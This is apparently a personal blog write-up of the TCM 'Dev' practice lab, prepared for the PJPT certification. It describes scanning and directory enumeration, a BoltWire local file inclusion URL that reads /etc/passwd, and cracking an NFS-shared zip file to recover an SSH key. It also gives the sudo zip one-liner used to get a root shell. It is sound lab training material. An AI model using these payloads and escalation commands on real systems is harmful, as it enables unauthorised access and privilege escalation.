---
layout: post
title: TCM - practice for dev
subtitle: Preparing for PJPT (Practical Junior Penetration Tester) certification by walking through dev lab from TCM
tags: [ethical hacking, tcm, pjpt, dev, privilege escalation, CMS]
comments: true
author: Lantana Park
---

# Dev

## Scanning/Enumeration

1. Scanned open ports.

   `nmap -T4 -p- -A 192.168.64.23`

   `-T4` is to speed up the scan by reducing delays

   `-p-` is to tell nmap to scan all 65,535 TCP ports

   `-A` is to enable nmap a comprehensive scan including os detection, version detection and script scanning.

   ![nmapScan](../assets/img/dev/Screenshot%202024-07-09%20at%2018.58.02.png)

   ![nmapScan](../assets/img/dev/Screenshot%202024-07-09%20at%2018.58.23.png)

   According to the nmap scan, I found interesting things that there are two http services and nfs (network file system). In this time, I had a chance to search about nfs. It was interesting.

   NFS is a protocol for file sharing. I was confused about the differences between FTP(20 or 21) and NFS(2049). Here is the differences I found.

   NFS is designed to allow multiple local clients to share directories and files from a central server. It is suitable for scenarios requiring centralized storage, consistent access to files, and efficient management of shared resources for multiple clients. Administrators can manage files and permissions centrally, simplifying maintenance and backups.

   ![nfs](../assets/img/dev/nfs.png) from Huawei

   FTP(20 or 21) is designed to transfer large files between a client and a server. Basic FTP does not encrypt data. However secure version like FTPS and SFTP provide encryption for data in transit. FPT is commonly used for website management, software distribution, and exchanging files with external parties.

   ![ftp](../assets/img/dev/ftp.jpg) from CISCO

   Additionally, RPC(Remote Procedure Call) is a protocol that allows a program to request a service from a server program in a network. APIs can utilize RPC as a communication mechanism to enable remote clients to invoke functions or procedures exposed by the API. For example, when a client calls this endpoint `/weather/forecast`, the API service can use RPC to fetch the forecast data from a remote weather service and then return it to the client. For further information, REST API and RPC API have different architectures.

   The picture below is for the transport process of RPC over HTTP

   ![rpcHTTP](../assets/img/dev/httprpc1.png) from microsoft Learn

   Noted information

   `22/tcp	open  ssh  	OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)`

   `80/tcp	open  http 	Apache httpd 2.4.38 ((Debian))`

   `111/tcp   open  rpcbind  2-4 (RPC #100000)`

   `2049/tcp  open  nfs  	3-4 (RPC #100003)`

   `8080/tcp  open  http 	Apache httpd 2.4.38 ((Debian))`

2. Found hidden directories of the HTTP websites (80 and 8080)

   This result was from the port 80.

   ![gobuster1](../assets/img/dev/Screenshot%202024-07-09%20at%2018.59.07.png)

   `/app`,`/extensions`, `/public`, `/src`, and `/vendor` pages were founded

   ![index.php1](../assets/img/dev/Screenshot%202024-07-09%20at%2013.44.55.png)

   ![src](../assets/img/dev/Screenshot%202024-07-09%20at%2023.12.53.png)

   ![public](../assets/img/dev/Screenshot%202024-07-09%20at%2023.12.31.png)

   ![vendor](../assets/img/dev/Screenshot%202024-07-09%20at%2023.13.26.png)

   ![app](../assets/img/dev/Screenshot%202024-07-09%20at%2023.11.50.png)

   When developing a website, I typically store confidential settings in a configuration file. Hence I visited the `/config/` directory.

   ![app2](../assets/img/dev/Screenshot%202024-07-09%20at%2023.16.46.png)

   ![app3](../assets/img/dev/Screenshot%202024-07-09%20at%2023.16.56.png)

   I found a clue about username and password

   - username : **bolt**
   - password : **I_love_java**

   I could feel how much the bolt user loves java.

   This result was from the port 8080.

   ![gobuster2](../assets/img/dev/Screenshot%202024-07-09%20at%2018.58.45.png)

   `/dev` was founded

   ![index.php2](../assets/img/dev/Screenshot%202024-07-09%20at%2013.42.36.png)

   bolt cms page was founded.

   ![dev](../assets/img/dev/Screenshot%202024-07-09%20at%2023.29.05.png)

3. I thought there are cms vulnerabilities for sure, so that I searched which vulnerabilities this cms - boltWire has.

   ![searching](../assets/img/dev/Screenshot%202024-07-09%20at%2023.33.39.png)

   ![searching2](../assets/img/dev/Screenshot%202024-07-10%20at%2009.09.35.png)

   Since `6.03 - Local file inclusion` came as the first searching result. I decided †o exploit this vulnerability at first.

   ![exploitDB](../assets/img/dev/Screenshot%202024-07-10%20at%2008.59.13.png)

   ![exploitDB](../assets/img/dev/Screenshot%202024-07-10%20at%2008.59.28.png)

   To begin with, I registered as a user 123 and then logged in.

   ![loggedin](../assets/img/dev/Screenshot%202024-07-10%20at%2009.02.21.png)

   And then accessed `/passwd` file inputting `http://192.168.64.23:8080/dev/index.php?p=action.search&action=../../../../../../../etc/passwd`

   ![passwd1](../assets/img/dev/Screenshot%202024-07-09%20at%2015.44.51.png)

   ![passwd2](../assets/img/dev/Screenshot%202024-07-09%20at%2015.45.04.png)

   There are user account information. It does not store actual passwords, `/etc/shadow` will store the actual password. However I could know usernames that this website have.

   ```
   root:x:0:0:root:/root:/bin/bash
   daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
   bin:x:2:2:bin:/bin:/usr/sbin/nologin
   sys:x:3:3:sys:/dev:/usr/sbin/nologin
   sync:x:4:65534:sync:/bin:/bin/sync
   games:x:5:60:games:/usr/games:/usr/sbin/nologin
   man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
   lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
   mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
   news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
   uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
   proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
   www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
   backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
   list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
   irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
   gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
   nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
   _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
   systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
   systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
   systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
   messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
   sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
   jeanpaul:x:1000:1000:jeanpaul,,,:/home/jeanpaul:/bin/bash
   systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
   mysql:x:106:113:MySQL Server,,,:/nonexistent:/bin/false
   _rpc:x:107:65534::/run/rpcbind:/usr/sbin/nologin
   statd:x:108:65534::/var/lib/nfs:/usr/sbin/nologin
   ```

   As `/usr/sbin/nologin` means that the account is not available to login, only `root` and `jeanpaul` are the available usernames I can utilize to get a shell.

   Furthermore, I exploit this vulnerability in a different way.

   ![github1](../assets/img/dev/Screenshot%202024-07-10%20at%2009.01.13.png)

   ![github2](../assets/img/dev/Screenshot%202024-07-10%20at%2009.01.23.png)

   ![github3](../assets/img/dev/Screenshot%202024-07-10%20at%2009.01.30.png)

   With the revised url address - `http://192.168.64.23:8080/dev/index.php?p=member.admin&action=data`. I could get the admin's password.

   - member.admin : **I_love_java**

   ![adminPassword](../assets/img/dev/Screenshot%202024-07-10%20at%2009.02.41.png)

   So I tried to access ssh with these information I collected so far.

   ![sshAccess](../assets/img/dev/Screenshot%202024-07-10%20at%2009.41.25.png)

   Failed to get access to the ssh....

4. Let's enumerate `nfs` protocol to explore the services and data accessible via NFS.

   I used `showmount` command to list all NFS shares.

   ![showamount](../assets/img/dev/Screenshot%202024-07-10%20at%2010.11.35.png)

   I could see that `/srv/nfs` was shared. So that I attempted to mount the identified share locally on my system.

   ![mounting](../assets/img/dev/Screenshot%202024-07-10%20at%2010.02.16.png)

   ![zipPasswd](../assets/img/dev/Screenshot%202024-07-10%20at%2010.02.28.png)

   There was a `save.zip` file. However I did not know the id_rsa password.

   Let's try to crack the password using `fcrackzip`

   ![crackPassword](../assets/img/dev/Screenshot%202024-07-10%20at%2010.02.43.png)

   ![passwordFound](../assets/img/dev/Screenshot%202024-07-10%20at%2010.02.59.png)

   The password for the zip file was java101

   Unzipped the file and then which files were included.

   ![unZipped](../assets/img/dev/Screenshot%202024-07-10%20at%2010.03.06.png)

   ![readingTextfile](../assets/img/dev/Screenshot%202024-07-10%20at%2010.03.16.png)

   I could guess that jeanpual will be admin user and its password can be `I_love_java` and then checked the `id_rsa` file.

   ![rsafile](../assets/img/dev/Screenshot%202024-07-10%20at%2010.28.28.png)

   It was the private key to get access the ssh. So that I decided to use this private key to the ssh using `jeanpaul` username.

## Exploitation

1. Exploited the information I enumerated so far in order to get a remote shell and then root privilege.

   I entered the `I_love_java` for the passphrase.

   ![GotTheShell](../assets/img/dev/Screenshot%202024-07-10%20at%2010.04.06.png)

   Tried to see the password of root user and then escalate privilege using `sudo -l` command.

   ![sudoL](../assets/img/dev/Screenshot%202024-07-10%20at%2010.04.21.png)

   I needed to use `/usr/bin/zip` to go up to root privilege.

   I leveraged `gfobins` to get information about how can I use the `zip`.

   ![gfobins1](../assets/img/dev/Screenshot%202024-07-10%20at%2010.42.20.png)

   ![gfobins2](../assets/img/dev/Screenshot%202024-07-10%20at%2010.42.12.png)

   ![gfobins3](../assets/img/dev/Screenshot%202024-07-10%20at%2010.41.34.png)

   Copied and pasted the command lines to escalate privileged access.

   `TF=$(mktemp -u)`

   `sudo zip $TF /etc/hosts -T -TT 'sh #'`

   `sudo rm $TF`

   ![rootUser](../assets/img/dev/Screenshot%202024-07-10%20at%2010.05.02.png)
